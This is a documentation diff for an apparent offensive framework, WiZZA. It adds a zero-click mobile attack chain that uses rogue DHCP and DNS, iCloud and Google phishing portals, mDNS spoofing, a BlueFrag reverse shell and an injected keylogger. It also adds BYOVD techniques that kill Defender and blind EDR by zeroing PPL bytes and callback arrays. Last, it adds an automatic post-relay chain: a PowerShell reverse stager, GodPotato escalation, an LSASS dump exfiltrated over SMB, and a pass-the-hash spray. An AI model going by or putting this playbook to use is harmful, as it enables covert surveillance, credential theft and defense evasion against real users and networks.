@@ -897,6 +897,60 @@ Capabilities:
 - Clipboard
 - File exfiltration
 
+### Zero-Click Mobile PWN Chain
+
+Targets every iOS and Android device on the LAN simultaneously with zero user interaction:
+
+```bash
+start mobile pwn
+```
+
+Prompts for BlueFrag Bluetooth scan (optional, requires BT adapter) and ARP spoof target (optional).
+Calls `ensure_c2` before launching — C2 panel auto-opens.
+
+**L1 — Rogue DHCP**
+Races the legitimate DHCP server. Every phone that connects gets attacker as DNS (and optionally gateway).
+Fingerprints device type from Option 55 parameter list: iOS requests option 252 (WPAD), Android requests 26/28.
+
+**L2 — Rogue DNS**
+Three-tier selective hijacking:
+- Captive-check domains (`captive.apple.com`, `connectivitycheck.gstatic.com`) → attacker IP (triggers auto-open)
+- High-value domains (iCloud, Google, Facebook) → phishing IP
+- Everything else → 8.8.8.8 (internet stays up, no suspicion)
+
+**L3 — Captive Portal (zero user action)**
+iOS/Android check connectivity every few minutes — auto-opens browser automatically.
+Device-aware phishing page: iCloud UI for iOS, Google UI for Android.
+
+Silent collection (no prompt): GPS, battery level, screen resolution, WebRTC real IP, network type, sensors.
+
+With Service Worker: persistent C2 after browser close, background sync, push commands.
+
+Captures with prompt: Contacts API, Web Bluetooth scan, Beacon/proximity data.
+
+All data POSTed to `/mobile_catch` → C2 auto-registers device in mobile panel.
+
+**L4 — mDNS Poisoner**
+Responds to iOS Bonjour and Android NSD service queries:
+`_airplay._tcp`, `_raop._tcp` → spoof Apple TV / HomePod
+`_ipp._tcp`, `_ipps._tcp` → fake AirPrint printer (iOS auto-connects)
+`_googlecast._tcp` → fake Chromecast (Android auto-connects)
+`_airdrop._tcp` → AirDrop proximity attack surface
+
+**L5 — BlueFrag CVE-2020-0022**
+Bluetooth zero-click RCE against Android 8.0–9.0. No pairing required.
+Raw HCI socket → L2CAP start frame with `total_len=0xFFFF` (negative when sign-extended) → heap overflow in Bluetooth driver → reverse shell via RFCOMM.
+
+**L6 — ARP Inject**
+Classic MitM. Injects JS keylogger into every HTTP response the phone receives.
+
+**C2 Integration**
+All six layers report to C2:
+- `/mobile_catch` — credentials, GPS, fingerprint, 2FA codes, contacts
+- `/sw_beacon` — Service Worker heartbeats
+- `/sync` — background sync data
+Mobile panel: `http://localhost:8888/mobile`
+
 ### Browser Hook (No Install)
 
 When you have MitM position, the `intercept.py` proxy automatically injects a JavaScript hook into every page:
@@ -2179,8 +2233,11 @@ The BYOVD (Bring Your Own Vulnerable Driver) engine (`op/modules/byovd.py`) prov
 | RTCore64.sys | MSI Afterburner | `\\\\.\\RTCore64` | IOCTL 0x80002048/0x80002044 |
 | dbutil_2_3.sys | Dell DBUtil 2.3 | `\\\\.\\DBUtil_2_3` | IOCTL 0x9B0C1EC8 |
 | mhyprot2.sys | Genshin Impact | `\\\\.\\mhyprot2` | IOCTL 0x80034000 + 0x800000C8 |
+| gdrv.sys | GIGABYTE App Center ≤2.x | `\\\\.\\GDrv` | IOCTL 0xC3502808/0xC350A808 — CVE-2018-19320 |
 
 > **mhyprot2** has an additional capability: IOCTL `0x800000C8` can terminate any process by PID, including PPL-protected processes like `MsMpEng.exe` and `SenseIR.exe`. This is not possible via normal `TerminateProcess()`.
+
+> **gdrv.sys** provides arbitrary physical memory read/write and MSR read (IOCTL 0xC3502004). Used in `kill_defender()` as a fallback: if mhyprot2 is unavailable, RTCore64/gdrv walks the `EPROCESS` chain, finds the target process, and zeroes the `Protection` byte at offset `0x87A` — bypassing PPL entirely.
 
 ## Usage
 
@@ -2194,7 +2251,16 @@ BYOVD C:\path\to\driver.sys # Use custom driver
 
 # Via C2 REST API
 GET /byovd?action=remove_callbacks&driver=rtcore64
+GET /byovd?action=full_blind&driver=rtcore64    # remove callbacks + kill_defender()
 ```
+
+## Actions
+
+| Action | Effect |
+|--------|--------|
+| `remove_callbacks` | Zero all four EDR kernel notify arrays (EDR goes deaf) |
+| `kill_defender` | Kill all PPL-protected Defender/EDR processes (mhyprot2 IOCTL or RTCore64 EPROCESS walk) |
+| `full_blind` | `remove_callbacks` + `kill_defender` — full combined wipe |
 
 ## What Gets Wiped
 
@@ -2353,6 +2419,18 @@ ZERO_CLICK mdns
 ZERO_CLICK adidns
 ZERO_CLICK dcom <target_ip>
 ```
+
+## Post-Exploitation Auto-Trigger
+
+When SMB relay (Vector 3) succeeds, WiZZA **automatically** launches the full post-exploitation chain against the relayed target — no operator action required:
+
+```
+Relay success → add wizza admin + PS stager on :4445 → PostExploit thread spawns
+→ GodPotato LPE (Admin→SYSTEM) → BYOVD blind (RTCore64 PS payload, EDR wiped)
+→ LSASS dump (comsvcs MiniDump) → pypykatz parse → CrackMapExec PTH spray /24
+```
+
+See **Appendix A.5** for full step-by-step breakdown.
 
 ## Requirements
 
@@ -2534,6 +2612,59 @@ WEB_EXPLOIT bigip_rce <url>
 | RTCore64.sys | MSI (Afterburner) | `\\.\\RTCore64` | Kernel R/W, EDR callback wipe |
 | dbutil_2_3.sys | Dell | `\\.\\DBUtil_2_3` | Kernel R/W, EDR callback wipe |
 | mhyprot2.sys | miHoYo (Genshin) | `\\.\\mhyprot2` | Kernel R/W + PPL process kill |
+| gdrv.sys | GIGABYTE (App Center ≤2.x) | `\\.\\GDrv` | Arbitrary physical R/W + MSR — CVE-2018-19320 |
+
+`kill_defender()` tries mhyprot2 kill IOCTL first (PPL bypass), falls back to RTCore64 EPROCESS walk — zeroes `Protection` byte at offset `0x87A` on target process → TerminateProcess succeeds even against PPL-protected Defender/SenseIR.
+
+## Appendix A.5 — Auto Post-Exploitation Chain
+
+After SMB relay succeeds (`zero_click` module), WiZZA automatically launches an 8-step post-exploitation pipeline against the target. No manual trigger needed.
+
+```
+zero_click → relay success → PostExploit thread spawns automatically
+```
+
+### Steps
+
+| Step | Action | Tool |
+|------|--------|------|
+| 1 | Drop + exec PowerShell reverse TCP stager on port 4445 | UTF-16LE Base64 `-enc` |
+| 2 | Check privilege level | `whoami /priv` |
+| 3 | LPE: Admin → SYSTEM | GodPotato-NET4 (SeImpersonatePrivilege) |
+| 4 | BYOVD blind — wipe EDR callbacks + kill Defender | RTCore64 PS payload (6873 bytes) |
+| 5 | LSASS dump | comsvcs.dll MiniDump → SMB exfil; fallback procdump |
+| 6 | Parse dump | pypykatz (plaintext, NTHash, Kerberos tickets) |
+| 7 | PTH spray /24 | CrackMapExec with harvested NT hashes |
+| 8 | Report loot | console + C2 |
+
+### BYOVD PS Payload (Step 4)
+
+PowerShell P/Invoke payload that:
+1. Loads `RTCore64.sys` as a service
+2. Reads `PsActiveProcessHead` from `ntoskrnl.exe .data` section
+3. Walks `EPROCESS.ActiveProcessLinks` to find WdFilter/SentinelElara/CsAgent
+4. Zeros `Protection` byte at offset `0x87A` (PPL bypass)
+5. Kills process with `TerminateProcess`
+6. Scans `PspCreateProcessNotifyRoutine` / `PspLoadImageNotifyRoutine` callback arrays
+7. NULLs all EDR entries — EDR kernel driver goes deaf
+
+Net result: Defender non-functional on fully-patched Windows 10/11 before LSASS dump.
+
+### Output Files
+
+```
+/tmp/wizza_loot/
+├── lsass_<target>.dmp     Raw LSASS minidump
+├── creds_<target>.txt     pypykatz parsed output (plaintext + hashes)
+└── pth_spray_<target>.txt CrackMapExec PTH spray results
+```
+
+### Module
+
+```python
+from post_exploit import auto_post_exploit
+result = auto_post_exploit(target_ip, lhost, shell_port=4445, lpe_port=4446)
+```
 
 ## Appendix B — Agent Command Summary
 
@@ -2570,6 +2701,11 @@ WEB_EXPLOIT bigip_rce <url>
 - `ZERO_CLICK` — full chain (IPv6 RA + WPAD/NTLMv1 + SMB relay + mDNS + ADIDNS)
 - `ZERO_CLICK ipv6_ra` / `ZERO_CLICK wpad` / `ZERO_CLICK smb_relay`
 - `ZERO_CLICK mdns` / `ZERO_CLICK adidns` / `ZERO_CLICK dcom <target>`
+- On relay success: post-exploit chain fires automatically (see Appendix A.5)
+
+**Auto Post-Exploitation Chain (fires automatically on relay success):**
+- `POST_EXPLOIT` — relay→LPE→BYOVD blind→LSASS dump→pypykatz→CrackMapExec PTH spray /24
+  Steps: PS stager :4445 → GodPotato (Admin→SYSTEM) → RTCore64 EDR wipe → comsvcs dump → spray
 
 **Active Directory:** `AD_ENUM <dc> <domain> <user> <pass>`, `KERBEROAST <dc> <domain> <user> <pass>`, `AS_REP_ROAST <dc> <domain> <users_file>`, `DCSYNC <dc> <domain> <user> <pass> [target]`, `BLOODHOUND <dc> <domain> <user> <pass>`, `PASS_THE_HASH <target> <domain> <user> <hash> [cmd]`, `GOLDEN_TICKET <domain> <sid> <krbtgt_hash> [user]`
 
